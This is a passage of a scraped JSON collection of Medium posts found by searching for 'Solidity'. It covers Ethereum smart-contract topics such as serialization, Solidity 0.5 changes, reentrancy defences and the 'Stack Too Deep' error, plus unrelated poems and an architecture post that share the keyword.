tokenS = 2;  address   tokenB = 3;  uint      amountS = 4;  uint      amountB = 5;  uint      validSince = 6;  uint tokenSpendableS = 7;  uint tokenSpendableFee = 8;}The numbers behind field names are the fields\u2019 indices which uniquely identify the fields in the serialized byte array, not their names.A compiler can be made available to compile simple_order.prosol into a file called generated/SimpleOrderLib.sol with the following content:pragma solidity 0.4.24;pragma experimental \"v0.5.0\";pragma experimental \"ABIEncoderV2\";import \"path/to/Prosol.sol\"; // this has some basic methods./// Automatically generated from simple_order.prosol/// Do not change manually.library SimpleOrderLib {  struct SimpleOrder {    address   owner;  // pos=1;    address   tokenS;  // pos=2;    address   tokenB;  // pos=3;    uint    amountS;  // pos=4;    uint    amountB;  // pos=5;    uint    validSince;  // pos=6;    uint tokenSpendableS;  // pos=7;    uint tokenSpendableFee;  // pos=8;  }function toBytes(SimpleOrder simpleOrder)    pure    returns (bytes output) {    // generated code below  }function toSimpleOrder(bytes input)    pure    returns (SimpleOrder simpleOrder) {    // generated code below  }}With this generated library, we can change the submitSimpleOrder function to something like this:pragma solidity 0.4.24;import \"generated/SimpleOrderLib.sol\";using SimpleOrderLib for bytes;using SimpleOrderLib for SimpleOrder;function submitSimpleOrder(bytes input) {  SimpleOrderLib.SimpleOrder order = input.toSimpleOrder();  bytes output = order.toBytes();  // ...}Default ValuesWhen serializing a struct into a bytes, all fields with default values should be omitted to save space.Support Embedded StructureThe compiler also needs to support embedded structures. Substructures should have their own indexing space. For example:// simple_order.prosolstructure Spendables {  uint tokenSpendableS = 1;  uint tokenSpendableFee = 1;}structure SimpleOrder {  address   owner = 1;  address   tokenS = 2;  address   tokenB = 3;  uint      amountS = 4;  uint      amountB = 5;  uint      validSince = 6;  Spendables spendables = 7;}We may need to restrict the number of fields per structure in order to make sure the indices themselves do not take too many bits. After all, reducing the size of transaction data payload and gas consumption is our objective.Support Repeated FieldsRepeated fields should be compiled into an array. In the example below, the spendables fields should have a solidity type of Spendables[].// simple_order.prosolstructure SimpleOrder {  address   owner = 1;  address   tokenS = 2;  address   tokenB = 3;  uint      amountS = 4;  uint      amountB = 5;  uint      validSince = 6;  repeated Spendables spendables = 7;}To stay up-to-date with Loopring, please sign up for Loopring\u2019s Bi-Weekly Update, and find us here:Twitter: twitter.com/loopringorgReddit: reddit.com/r/loopringorgTelegram: t.me/loopring_enTelegram: t.me/loopringfans (Chinese)Discord: discord.gg/KkYccYpStackOverflow: stackoverflow.com/c/loopringKakao: open.kakao.com/o/gJbSZdF (Korean)", "responses": 0, "tags": ["Ethereum", "Hackathon", "Bounty", "Technology", "New"]}, {"title": "Call for Sponsorship of a local Ethereum event: Solidity 0.5 walkthrough at Progressbar in Bratislava, Slovakia", "post_link": "https://medium.com/wearekickback/call-for-sponsorship-of-a-local-ethereum-event-solidity-5-0-91b9e8b2f453?source=search_post", "author_name": "makoto_inoue", "author_link": "https://medium.com/@makoto_inoue", "publish_date": "2018-11-26", "last_modified_date": "2018-11-27", "readtime": "4.64", "claps": 39, "voters": 3, "content": "Call for Sponsorship of a local Ethereum event: Solidity 0.5 walkthrough at Progressbar in Bratislava, Slovakiamakoto_inoueFollowNov 26, 2018 \u00b7 5 min readRich meetups, poor meetupsProgressbar in Bratislava, SlovakiaCall for sponsorship of their upcoming Event\u00a0: Solidity 0.5 walkthroughRich meetups, poor meetups.During DevCon4, we hosted a series of events through our platform and many people liked our simple concept demonstrating the power of smart contract (or the simple fact that they got more ETH just by turning up).More importantly, we are very grateful that the majority of event organisers paid for our service (1 euro per 1 RSVP during DevCon4 which is subject to change).The amount is decided through various conversations with dozens of organisers who filled in our early access form. While some organisations had enough budget to cover our fee, it is not a trivial amount for others who have less or no sponsorship.We also received multiple requests for paid events. Their intentions are mostly to cover the cost of drinks and snacks rather than intending to make a profit. This means that the difference between free events and small fee events are just the lack of enough sponsorship, as newly formed meetups or rural meetups lacks enough stream of sponsorship as compared to big meetups in big cities. Is there any way we can help these organisers to get enough sponsorship so that they can afford to pay us while making the meetup itself more sustainable?That\u2019s pretty much what I was thinking throughout DevCon4 and that\u2019s when I met Matej who runs a hackerspace & co-working space called \u201cProgressbar\u201d in Bratislava, Slovakia.Progressbar in Bratislava, SlovakiaBratislava has a nice balance between huge city & village. Everyday something is happening in Bratislava \u2014 events, concerts, art expositions, parties, meetups so on. Bratislava has lots of parks & green areas where you can go & feel like you\u2019re in nature & escape the rush of the \u201cworld\u201d . Bratislava has really nice historical city centre with lots of really good restaurants that are affordable, plus our co-working space is in this area.A legendary hackerspace in Bratislava, Progressbar is the centre of the cryptocurrency community in Slovakia with the biggest draw for tech people \u2014 having organized Bitcoin events back in the days since 2012, or hosting Vitalik way before it was cool.Progressbar is a space where you can fully concentrate on your work. You basically have everything you need \u2014 work there & enjoy nice street view on Dunajska street, do pull ups on the pull up bar, have meetings in our new glass meeting room with whiteboard & projector, take calls in a call room, rest in our chill zone on the bags & couch area, organize event & meet ups as we have all necessary equipment like projectors, microphones, speakers, lots of chairs & tables (ideal for tech meetup). Progressbar is mainly a co-working space, but in the evening the space hosts events. Sometimes co-workers like to network so they just bring some drinks to the space & have private parties that anyone can be a part of.Recently Progressbar is embracing using public issues for transparency using github issues \u2014 showcasing the community over proprietary mediums https://instagram.com/progressbar_sk and our semi-private Progressbar Daily album.Their upcoming events can be found at their events page and facebook page.Progressbar has Python meetups on monthly basis, but anything tech related is welcome. They have hosted a Bitcoin quiz, Cryptowine, Hacktoberfest, Crypto meetup, Stellar meetup, Ethereum meetup, Bitcoin meetup, Machine Learning meetups, Nodeschool Bratislava and recently hosted valuable guests Vlad Zamfir, Amir Taaki and Harry Halpin with great talk about Politics of Cryptoanarchy and Governance. About twice a week there are events in Progressbar. During weekends the space is used by companies that hold trainings there, for example Hemisfera (camp program, where they teach kids to code) was training their new teachers for 3 weekends Progressbar has also been hosting ESA Copernicus as well. In the future they would like to be testbed for Ethereum ecosystem & projects in real world.Call for sponsorship of their upcoming Event\u00a0: Solidity 0.5 walkthroughWe have a joint proposal between Progressbar and Kickback. Matej is currently planning a meetup in Mid December where they dive into the new features of Solidity 0.5 featuring Gleb Urvanov.Speaker: Gleb UrvanovBio: Software developer, qualified specialist in field of information technologies with experience in project management. During the last 7 years has been working as a software engineer for private and state companies, including Ministry of Defence of Russian Federation. Used to work on a team in an Agile environment as well as solitaire, solving critical tasks. Besides extensive experience within different commercial projects, he has won several national awards in scientific and professional areas. A Blockchain enthusiast, Gleb participated in a several cryptocurrency-related startups as a smart contract developer. He has spoken at five international conferences in the field of computer science and was the youngest speaker at the international conference of robotics in Sochi \u2014 2014The event currently has no sponsorship, but we are currently open to organisations who can sponsor \u20ac300 to cover drinks, foods, and the fee to use Kickback.Matej and I had a bit of brainstorming and here are the list of things we can potentially offer in exchange for the sponsorshipYour company logo on Kickback event pageA few minutes slot to talk about your company (they are planning to livestream using facebook live)If they manage to edit video, have your company logo at the beginning of the videoInterview or articles about your organisation on Kickback (here are the examples)This is a bit of experiment to see if there is any appetite for global blockchain companies and projects to reach out and sponsor remote and locally organised meetups in support of the ecosystem.If you would like to be a sponsor, please contact matej.nemcek@geefu.netNOTE: If you are interested in simply donating than sponsoring an event, you can donate at their donation page.", "responses": 0, "tags": ["Blockchain", "Ethereum", "Slovakia"]}, {"title": "Stop Using Solidity\u2019s transfer() Now", "post_link": "https://medium.com/consensys-diligence/stop-using-soliditys-transfer-now-b1b6d2d00faf?source=search_post", "author_name": "Steve Marx", "author_link": "https://medium.com/@smarx", "publish_date": "2019-09-02", "last_modified_date": "2019-09-04", "readtime": "3.64", "claps": 58, "voters": 4, "content": "Stop Using Solidity\u2019s transfer() NowSteve MarxFollowSep 2 \u00b7 4 min readThis article was originally published at https://diligence.consensys.net. Please read it there, where it includes code examples and has better formatting.It looks like EIP 1884 is headed our way in the Istanbul hard fork. This change increases the gas cost of the SLOAD operation and therefore breaks some existing smart contracts.Those contracts will break because their fallback functions used to consume less than 2300 gas, and they\u2019ll now consume more. Why is 2300 gas significant? It\u2019s the hardcoded amount of gas a contract\u2019s fallback function receives if it\u2019s called via Solidity\u2019s transfer() or send() methods.Since its introduction, transfer() has typically been recommended by the security community because it helps guard against reentrancy attacks. This guidance made sense under the assumption that gas costs wouldn't change, but that assumption turned out to be incorrect. We now recommend that transfer() and send() be avoided.Gas Costs Can and Will ChangeEach opcode supported by the EVM has an associated gas cost. For example, SLOAD, which reads a word from storage, currently-but not for long-costs 200 gas. The gas costs aren't arbitrary. They're meant to reflect the underlying resources consumed by each operation on the nodes that make up Ethereum.From the EIP\u2019s motivation section:An imbalance between the price of an operation and the resource consumption (CPU time, memory etc) has several drawbacks:* It could be used for attacks, by filling blocks with underpriced operations which causes excessive block processing time.* Underpriced opcodes cause a skewed block gas limit, where sometimes blocks finish quickly but other blocks with similar gas use finish slowly.If operations are well-balanced, we can maximise the block gaslimit and have a more stable processing time.SLOAD has historically been underpriced, and EIP 1884 rectifies that.Smart Contracts Can\u2019t Depend on Gas CostsIf gas costs are subject to change, then smart contracts can\u2019t depend on any particular gas costs.Any smart contract that uses transfer() or send() is taking a hard dependency on gas costs by forwarding a fixed amount of gas: 2300.Our recommendation is to stop using transfer() and send() in your code and switch to using call() instead:Please see the original post for code!Other than the amount of gas forwarded, these two contracts are equivalent.What About Reentrancy?This was hopefully your first thought upon seeing the above code. The whole reason transfer() and send() were introduced was to address the cause of the infamous hack on The DAO. The idea was that 2300 gas is enough to emit a log entry but insufficient to make a reentrant call that then modifies storage.Remember, though, that gas costs are subject to change, which means this is a bad way to address reentrancy anyway. Earlier this year, the Constantinople fork was delayed because lowering gas costs caused code that was previously safe from reentrancy to no longer be.If we\u2019re not going to use transfer() and send() anymore, we'll have to protect against reentrancy in more robust ways. Fortunately, there are good solutions for this problem.Checks-Effects-Interactions PatternThe simplest way to eliminate reentrancy bugs is to use the checks-effects-interactions pattern. Here\u2019s a classic example of a reentrancy bug:Please see the original post for code!If msg.sender is a smart contract, it has an opportunity on line 6 to call withdraw() again before line 7 happens. In that second call, balanceOf[msg.sender] is still the original amount, so it will be transferred again. This can be repeated as many times as necessary to drain the smart contract.The idea of the checks-effects-interactions pattern is to make sure that all your interactions (external calls) happen at the end. A typical fix for the above code is as follows:Please see the original post for code!Notice that in this code, the balance is zeroed out before the transfer, so attempting to make a reentrant call to withdraw() will not benefit an attacker.Use a Reentrancy GuardAnother approach to preventing reentrancy is to explicitly check for and reject such calls. Here\u2019s a simple version of a reentrancy guard so you can see the idea:Please see the original post for code!With this code, if a reentrant call is attempted, the require on line 7 will reject it because lock is still set to true.A more sophisticated and gas-efficient version of this can be found in OpenZeppelin\u2019s ReentrancyGuard contract. If you inherit from ReentrancyGuard, you just need to decorate functions with nonReentrant to prevent reentrancy.Please note that this method only protects you if you explicitly apply it to all the right functions. It also carries an increased gas cost due to the need to persist a value in storage.What About Vyper?Vyper\u2019s send() function uses the same hardcoded gas stipend as Solidity's transfer(), so it too is to be avoided. You can use instead.Vyper has a @nonreentrant(<unique_key>) decorator built in that works similarly to OpenZeppelin's ReentrancyGuard.SummaryRecommending transfer() made sense under the assumption that gas costs are constant.Gas costs are not constant. Smart contracts should be robust to this fact.Solidity\u2019s transfer() and send() use a hardcoded gas amount.These methods should be avoided. Use .call.value(...)(\"\") instead.This carries a risk regarding reentrancy. Be sure to use one of the robust methods available for preventing reentrancy vulnerabilities.Vyper\u2019s send() has the same problem.Originally published at https://diligence.consensys.net on September 2, 2019.", "responses": 0, "tags": ["Ethereum", "Solidity", "Smart Contract Security"]}, {"title": "Changes to Solidity 0.5", "post_link": "https://medium.com/caelumlabs/changes-to-solidity-0-5-68cb9b02ad83?source=search_post", "author_name": "Alex Puig", "author_link": "https://medium.com/@alexpuig", "publish_date": "2018-08-28", "last_modified_date": "2018-10-08", "readtime": "1.16", "claps": 51, "voters": 3, "content": "Changes to Solidity 0.5Alex PuigFollowAug 28, 2018 \u00b7 2 min readThanks to Christian Reitwiessner. This is a summary of his last talk. Among many changes made, some warnings became errors in this new version. More changes focusing in safety. Main changes are :Explicit visibility : Visibility must be specified, it was a warning, now is an errorfunction withdraw() public {\u2026}Constructor syntax : Constructor can\u2019t be the name anymore:constructor() public {\u2026.}Emit is now needed for eventsemit Withdrawn();Explicit types. Now var is disallowed and you need to specify the type0.4 \u2192 for (var i=0; i<length; i++)0.5 \u2192 for (uint i=0; i<length; i++)Data Location. To specify a data location is function sum(uint[] a);0.5 \u2192 function sum(uint[] memory a);Storage Pointers have to be initialized and assigned0.4 \u2192 Data p; // valid in 0.4 by default it points to storage0.5 \u2192 participants.length += 1Data storage p = participants[participants.length-1]; // in 0.5Function-scoped variables. Solidity now uses regular scope blocks like c++, not like JavaScript anymore. Only exception being made in the for loop. It allows now to define a variable inside of a scope, which will be freed at the end of the scope, allowing us to pass the limitation of 16 variables per function.0.4 \u2192 i=3;if (false) { uint i;} // This will not work anymore0.5 \u2192 for (uint i = 0\u2026) // This works and you can declare it many times.Functionality Improvementsa.pop(); // for storage arraysabi.encode(\u2026)abi.encodePacked(\u2026)enums and strcts in interfaces", "responses": 0, "tags": ["Ethereum", "Blockchain", "Solidity"]}, {"title": "What is Scilla Programming Language? \u2014 Better than Solidity? \u2014 #TECH", "post_link": "https://medium.com/@saddington/what-is-scilla-programming-language-better-than-solidity-tech-84b44575807f?source=search_post", "author_name": "John Saddington", "author_link": "https://medium.com/@saddington", "publish_date": "2018-02-11", "last_modified_date": "2018-11-16", "readtime": "0.30", "claps": 1, "voters": 1, "content": "What is Scilla Programming Language? \u2014 Better than Solidity? \u2014 #TECHJohn SaddingtonFollowFeb 11, 2018 \u00b7 1 min readIs Scilla programming language better than solidity? Is this the future?Originally published at DECENTRALIZED TV.", "responses": 0, "tags": ["Blockchain", "Bitcoin", "Cryptocurrency", "Scilla", "Solidity"]}, {"title": "A Guide to Solidity", "post_link": "https://medium.com/@monetha/a-guide-to-solidity-4f9c217b4660?source=search_post", "author_name": "Monetha", "author_link": "https://medium.com/@monetha", "publish_date": "2019-03-19", "last_modified_date": "2019-03-29", "readtime": "4.52", "claps": 2, "voters": 2, "content": "A Guide to SolidityMonethaFollowMar 19 \u00b7 5 min readSolidity is an object-oriented programming language currently used to write smart contracts on different blockchain platforms, including Ethereum. First proposed by Gavin Wood in 2014, it was later developed by Christian Reitwiessner and some of the core Ethereum contributors.   According to Wood, Solidity was designed based on ECMAScript, the standard script used for JavaScript, to make it easier for programmers to write and implement smart contracts on the Ethereum Virtual Machine (EVM).   That means if you can use C++, Python, Perl, Java, and other modern programming languages, it will be relatively easy for you to learn Solidity because it contains programming elements found in other languages. These similarities include variables, arithmetic operations, functions, classes, string manipulations, and more.   For example, if the C++ language allows you to create some code for \u201cmain function\u201d, Solidity creates a \u201ccontract\u201d in a similar process.   Since Solidity is a programming language designed specifically for writing smart contracts, it leaves an official record of transactions that cannot be repudiated. Programmers who are using it to write applications should keep the rules of the EVM in mind.   Solidity is the most popular of the programming languages used on the EVM (the others are LLL, Viper, Serpent, and Mutan). Some of its significant advantages compared to the other Ethereum programming languages are:\u2013 It supports complex member variables in smart contracts. Member variables are used in object-oriented programming and are associated with a specific object. Examples of these complex member variables are hierarchical structures and mappings.\u2013 It enables contracts to support inheritance. It is a mechanism in object-oriented programming that bases an object on another object or a class on another class. Inheritance in programming is similar to genetic inheritance: Just as a child inherits the traits of his parents, through inheritance, the programmer reuses the methods and fields of the existing class.\u2013 It has an Application Binary Interface (ABI), an interface between two program modules. One of these program modules is at the level of machine code. In Ethereum, Solidity supports an ABI that facilitates multiple type-safe functions within a single contract. Type safety refers to the process in which the Solidity command line compiler validates and deletes datatypes. If the programmer assigns a wrong datatype to a variable, the compiler will delete the error.Solidity and Smart ContractsA contract is a function \u2014 collection of code and data \u2014 in the Ethereum blockchain, written in Solidity and compiled into JSON or binary. After the compilation, the contract is sent to a specific address in the blockchain. Whoever wants to use the deployed contract just submits the correct data along with the Ether needed to pay for it.   Smart contract functions can be used to define conditions that all the parties using the contract agree upon. Smart contracts enable parties to deal and communicate with each other directly, eliminating the need for a middleman.   This feature gives developers vast opportunities to create things, such as new markets or registries of debts. All of these are possible as long as there is a consensus in the network that will validate all transactions.   Anyone can send a smart contract into the decentralized network, provided they pay a fee, which is proportional to the storage size of the code.Ethereum then stores the items in one of three places.\u2013 Storage \u2014 the place where all the contract\u2019s state variables can be found. A state variable is a set of variable that describes the mathematical state of a dynamic system. Each contract includes a storage which persists between function calls.\u2013 Memory \u2014 where temporary values are placed and erased between function calls. It is, therefore, advisable to use memory to store everything that is only temporary.\u2013 Stack \u2014 it works similarly to memory and is almost free. However, the stack has a minimum of 1024 items but only the top 16 items are easily accessible.Solidity OperatorsSolidity has four value types \u2014 types that are always passed by a value. This means that these types are always copied when utilized in assignments or for arguments. Furthermore, these types can interact with each other in expressions with operators.   Operators are also divided into four categories \u2014 arithmetic, incremental, bitwise, and logical.Arithmetic OperatorsAs the name suggests, these are math operations, like those used in most programming languages. Solidity also has an exponential operator in this category.\u2013 Addition: x + y\u2013 Subtraction: x \u2014 y\u2013 Division: x / y\u2013 Multiplication: x * y\u2013 Modulo/remainder: x%yIncremental OperatorsIn Solidity, incremental operators are:\u2013 A++\u2013 a-\u2013 ++a\u2013 -a\u2013 a+=1\u2013 a=a+1Bitwise Operators\u2013 Bitwise AND \u2014 &\u2013 Bitwise inclusive OR \u2014 |\u2013 Bitwise XOR (exclusive OR) ^\u2013 Bitwise NOT \u2014 ~\u2013 Bitwise right shift \u2192>\u2013 Bitwise left shift \u2014 <<Logical Operators\u2013 Logical negation !\u2013 Logical AND &&\u2013 Logical OR ||\u2013 Equality = =\u2013 Not equal ! =Solidity Value TypesBooleanThis value type uses the keyword \u201cbool,\u201d and its two possible values are constants: \u201ctrue\u201d and \u201cfalse.\u201d This value type uses logical operators, with the logical OR (| |) and the logical AND (& &) applying the common short-circuiting rules.   For example, in the expression m(x) | | n(y), if m(x) evaluates to true, n(y) will not be assessed whether it has a positive or negative side effect.IntegersThis value type uses the keywords \u201cint\u201d and \u201cuint\u201d \u2014 signed and unsigned integers, respectively. An unsigned integer can have a large positive value while a signed integer identifies whether the number is positive or negative using the left-most-bit. Signed integers can also hold numbers with both positive and negative values.These integers can have different values; thus, if you see keywords like uint8 to uint256 in steps of 8, that means they are unsigned integers of 8 up to 256 bits. Integers use bitwise and arithmetic operators as well as comparisons and shift operators.AddressThis value type uses the keyword \u201caddress\u201d and has two very similar formats: Address \u2014 this has a 20-byte value size, which is the size of an Ethereum address. Address payable \u2014 the same as the \u201caddress\u201d format but uses the \u201ctransfer\u201d and \u201csend\u201d functions.String LiteralsThese values are written using either single or double quotes: \u2018foo\u2019 or \u201cbar.\u201d They do not imply trailing zeroes like the C++ language. Strings literals use the backslash symbol to escape special characters like the ones below:\u2013 Backslash \\\\\u2013 Backspace \\b\u2013 Escapes an actual newline \\<newline>\u2013 Carriage return \\r\u2013 Double quote \\\u201d\u2013 Form feed \\f\u2013 Hex escape, see below \\xNN\u2013 Newline \\n\u2013 Single quote \\\u2019\u2013 Tab \\t\u2013 Vertical tab \\v\u2013 Unicode escape, \\uNNN", "responses": 0, "tags": ["Ethereum", "Blockchain", "Solidity", "Smart Contracts", "Guides And Tutorials"]}, {"title": "Nerdrum\u2019s Solidity", "post_link": "https://medium.com/prose-poetry-flash-fiction/nerdrum-s-solidity-ef0f98963278?source=search_post", "author_name": "Don Winiecki", "author_link": "https://medium.com/@dwiniecki", "publish_date": "2015-06-28", "last_modified_date": "2015-10-04", "readtime": "0.86", "claps": 0, "voters": 0, "content": "\u201cNerdrum\u2019s Cloud (ANA20150408090443)\u201d. (2015). 46\"w x 28\"h. Don Winiecki/ANANerdrum\u2019s SolidityDon WinieckiFollowJun 28, 2015 \u00b7 1 min readEerily floating beyond, these clouds \u2014 with their atmospheric impasto and subtle and creamy solar Ochre and faint and warm terrestrial Terra Rosa edges anchoring them to the muted-blue sky \u2014 appeared more solid even than the birds and drones that flew \u2014 almost frozen in the distance \u2014 among them \u2014 especially in the low dusky light at this very moment.When I was a boy I thought clouds like this were made of finely whipped marshmallow \u2014 so finely whipped that they could be suspended in the warm air rising from a factory behind the hazy verdant hill on the horizon that must have made them \u2014 reflecting the sun on their tops and the scorched earth below. This was something my older brother and his then-adolescent friends thought was laughably absurd.Yet there they are again, teasing memory and pushing me deeper into my ownmost self. I wonder what my brother and his friends would say about them now?\u201cNerdrum\u2019s Solidarity (ANA20150408090443)\u201d, 2015, 44\" x 28\", Don Winiecki/ANA", "responses": 0, "tags": ["Poetry", "Surrealism", "Prose Poem"]}, {"title": "Vyper Coding Language to Take On Solidity \u2014 More Secure Smart Contracts?", "post_link": "https://medium.com/@saddington/vyper-coding-language-to-take-on-solidity-more-secure-smart-contracts-ffd6b6bd1905?source=search_post", "author_name": "John Saddington", "author_link": "https://medium.com/@saddington", "publish_date": "2018-07-11", "last_modified_date": "2018-11-16", "readtime": "0.29", "claps": 0, "voters": 0, "content": "Vyper Coding Language to Take On Solidity \u2014 More Secure Smart Contracts?John SaddingtonFollowJul 11, 2018 \u00b7 1 min readVyper is going to disrupt Solidity\u2026 or, will it?Originally published at DECENTRALIZED TV.", "responses": 0, "tags": ["Vyper", "Blockchain", "Solidity", "Cryptocurrency", "Altcoins"]}, {"title": "University of Iowa Museum of Art: Rectilinear Solidity / Interconnected Voids", "post_link": "https://medium.com/@BNIM/university-of-iowa-museum-of-art-rectilinear-solidity-interconnected-voids-9b80e9cf62d1?source=search_post", "author_name": "BNIM", "author_link": "https://medium.com/@BNIM", "publish_date": "2017-12-07", "last_modified_date": "2018-01-12", "readtime": "1.91", "claps": 0, "voters": 0, "content": "University of Iowa Museum of Art: Rectilinear Solidity / Interconnected VoidsBNIMFollowDec 7, 2017 \u00b7 2 min readThe University of Iowa Museum of Art (UIMA) is conceived as a rectilinear solid interrupted by interconnected voids that form the protective and respectful home for the display, conservation, and storage of the collection while providing light-filled, interconnected volumes that emotionally, visually, and physically guide patrons as they experience the Museum.The articulated voids provide exterior exhibition spaces, educational areas, and horizontal and vertical circulation pathways; all intertwined by a three-story, light-filled exterior gallery comprising the core of the Museum and permeating the entirety of the experience.Recalling the timeless academic and cultural brick masonry buildings of Alvar Aalto, Louis Khan, and Eero and Eliel Saarinen, the exterior of the Museum is clad in brick masonry to complement the masonry characteristics of neighboring structures, and to convey the importance of the timelessness and stability of the collection housed within.Through a composition of alternating brick screens and textures that articulate the internal organization, the Museum fa\u00e7ade becomes transformative and animated by the daily and seasonal changes in exterior daylight quality and quantity \u2014 creating oscillating levels of reflectance, shadow, and animation.A dark, warm brick has been selected to contrast the predominantly red brick of the surrounding buildings and to clearly delineate the significance of the Museum in the hierarchy of buildings on campus while creating a meaningful dichotomy with the white-light-filled interiors and warm wood detailing.Originally posted to bnim.com by Rod Kruse, Levi Robb, and Carey Nagle.", "responses": 0, "tags": ["Architecture", "Museums", "Design", "Modernism", "Art"]}, {"title": "Flattening your Solidity files", "post_link": "https://medium.com/@kayuzee/flattening-your-solidity-files-702dec89f0bd?source=search_post", "author_name": "Qayyum Rajan", "author_link": "https://medium.com/@kayuzee", "publish_date": "2019-02-19", "last_modified_date": "2019-02-19", "readtime": "1.98", "claps": 4, "voters": 1, "content": "Flattening your Solidity filesQayyum RajanFollowFeb 19 \u00b7 2 min readThis article is geared towards those that are beginning to interact with smart contracts in ethereum.I\u2019ve been through this a few times \u2014 and for those just starting in the space \u2014 this can somewhat be an annoying process \u2014 especially when trying to get verified on Etherscan.ioTypically your files will be in a combination of subfolders \u2014 and this article is meant to give a more detailed overview for those that want to get their contracts source code verified. We will do this from scratch for those not familiar with using npm and the terminal.We will be using the POA Solidity Flattener found here (clone this to your local directory): https://github.com/poanetwork/solidity-flattenerFirst thing first is install NPM here.To use some reference files \u2014 we can use some token contracts from openzepplin who provides an awesome collection of free smart contracts.Open in Github Desktop, download the zip or clone the repo \u2014 whatever works for ya (I personally like Github Desktop).Get the repoWe can use contracts/token/ERC20/ERC20Mintable.sol \u2014 This is a standard mintable token.Mintable tokenSee how it starts with those two imports? Those are referencing other contracts in the repo. When it comes time to verify your source code, easy deployment of small contracts etc \u2014 what you want is a flattened file which holds all the imports in a single contract.Open up your terminal and cd into your poa network folder (soldity-flattener) and then enter npm install.You can now simply enter \u2018npm start\u2019 and add the file name of your smart contract (.sol file)Get startedSee that out folder\u2026Boom \u2014 flat file baby", "responses": 0, "tags": ["Ethereum", "Coding", "Blockchain"]}, {"title": "", "post_link": "https://medium.com/@davekaj/basically-if-you-taught-yourself-solidity-for-6-months-you-would-for-sure-be-able-to-get-a-job-f6c4e7a4f8aa?source=search_post", "author_name": "Dave Kajpust", "author_link": "https://medium.com/@davekaj", "publish_date": "2019-01-23", "last_modified_date": "2019-01-23", "readtime": "0.32", "claps": 1, "voters": 1, "content": "Hey Dave, great article and thank you for inspiring me, I have a question about a part-time\u20261SaurabhDave KajpustFollowJan 23 \u00b7 1 min readBasically, if you taught yourself Solidity for 6 months you would for sure be able to get a job. But, this article is over a year old, and that isn\u2019t completely true anymore.Solidity is in less demand because the market is so cold. It will probably pick back up in the future. But if you want to get hired, most companies right now would want to see some history of coding work experience.But that is just my best guess! Anything is still possible :)", "responses": 0, "tags": []}, {"title": "Solhint: An Advanced Linter for Ethereum\u2019s Solidity", "post_link": "https://medium.com/altoros-blog/solhint-an-advanced-linter-for-ethereums-solidity-e203a2cbb1be?source=search_post", "author_name": "Altoros", "author_link": "https://medium.com/@Altoros", "publish_date": "2017-12-08", "last_modified_date": "2018-06-06", "readtime": "0.62", "claps": 0, "voters": 0, "content": "Solhint: An Advanced Linter for Ethereum\u2019s SolidityAltorosFollowDec 8, 2017 \u00b7 1 min readThe linting solutions available for detecting code vulnerabilities of the Solidity programming language \u2014 underlying smart contracts in Ethereum \u2014 mostly focus on the code compliance with the best linting practices. This blog post overviews a comprehensive Solhint linter that allows for detecting syntax-related security code vulnerabilities. Covering a wide range of validation rules, the tool also enables developers to add new ones, while complying with the Solidity style guide and granting 2x\u20134x boost in performance.Read the full article on ProtoFire\u2019s blog:Solhint: An Advanced Linter for Ethereum\u2019s SolidityThe linting solutions available for detecting code vulnerabilities of the Solidity programming language \u2014 underlying\u2026medium.com", "responses": 0, "tags": ["Ethereum", "Solidity", "Smart Contracts", "Blockchain"]}, {"title": "SOLIDITY IS SOMETHING WE CREATE", "post_link": "https://medium.com/everything-comes/solidity-is-something-we-create-df81d747e26d?source=search_post", "author_name": "Stephen C. Rose", "author_link": "https://medium.com/@stephencrose", "publish_date": "2019-08-07", "last_modified_date": "2019-08-07", "readtime": "0.55", "claps": 0, "voters": 0, "content": "SOLIDITY IS SOMETHING WE CREATEStephen C. RoseFollowAug 7 \u00b7 1 min readSolidity is something we createAll levels of existence are the sameMentality produces matter\u2019s senseThis truth will soon be well beyond debate+When we know this I wonder will we changeOr will we simply say heaven\u2019s a dreamWe\u2019re knowing at a very rapid rateEach year will add new knowledge to our range+Solidity was once my proof of realI kicked a table and then closed my mindI don\u2019t fault myself for being denseI\u2019m still adjusting to what time can\u2019t steal", "responses": 0, "tags": ["Idealism", "Virtual", "Energy", "Substance", "Solidity"]}, {"title": "Understanding the \u201cStack Too Deep\u201d Error in Solidity", "post_link": "https://levelup.gitconnected.com/stack-too-deep-error-in-solidity-ca83326ff0f0?source=search_post", "author_name": "Aventus Network", "author_link": "https://levelup.gitconnected.com/@aventus", "publish_date": "2019-01-07", "last_modified_date": "2019-01-07", "readtime": "15.4", "claps": 50, "voters": 1, "content": "Understanding the \u201cStack Too Deep\u201d Error in SolidityLearn how the Ethereum Virtual Machine manages the stack and how the common Stack Too Deep error can occur in your Solidity codeAventus NetworkFollowJan 7 \u00b7 16 min readHappy New Year and may we all have great accomplishments in 2019! Aventus is welcoming you back from the winter holidays with a post related to errors in Solidity, by our very own, Alex Pinto.When one starts coding smart contracts in Solidity, sooner or later, s/he will hit a very annoying obstacle. The \u201cStack Too Deep\u201d error. It is easy to fall into this trap, and when that happens, it is often hard to find a way out. To be fair, the underlying reason is not in Solidity itself, but in the Ethereum Virtual Machine (EVM), and so will affect other languages that compile into EVM (ie LLL, Serpent, Viper), but that is a subtle distinction in the day-to-day job of coding smart contracts.Given how common and annoying this error can be, it is surprisingly difficult to find good resources on how to deal with it, so I decided to write this post to try to shine some light on it, for my own benefit and for anyone else who may be fighting with it.In general terms, the \u201cStack Too Deep\u201d error is generated when the code needs to access a slot in the stack that is deeper than its 16th element (counting from the top downwards). How this occurs can happen in many different ways. This post does not aim to offer a full theory of how this error is generated: from my experience, there are too many ways to do it. But it will give a good rationale for a common trigger, and will hopefully make the reader more aware of how the EVM manages its stack. It may even be possible to extend the same logic to other situation where the error occurs, and look for ways to avoid it.In Solidity, most types (ie. elementary types such as numbers, addresses, and booleans for example, but not arrays, structs nor mappings) are passed by value to a function. When the function is called, a part of the stack \u2014 a stack frame \u2014 is allocated to hold the return position. This is where the program should go to when the function returns (the \u2018return address\u2019). It also holds a copy of the function value-type input and output arguments. Each argument will normally hold a slot in the stack, where each slot is 256 bits.This provides the most basic way of hitting a \u201cStack Too Deep\u201d error: have a total of more than 16 input and output arguments. But in reality, if we want that function to do something useful, we will almost certainly need to reduce the number of arguments.To test this, I created a small contract in Remix like this:pragma solidity ^0.4.24;contract TestStackError {  event LogValue(uint);  function logArg(uint a1) public {    emit LogValue(a1);  }}Remix is great for investigating issues such as this because we can quickly write a contract and query it, and also because Remix gives a powerful debugger with opcode disassembly and a full listing of the stack, memory, and storage. In addition, it is easy to move backward and forward through the code, giving one of the best debugging experiences I\u2019ve had in any language.This contract is very simple: it has no state variables and only one function, which also is extremely uncomplicated. This function takes one argument and logs it.I copy this contract to a new file in Remix, compile it, and deploy it. There should be no 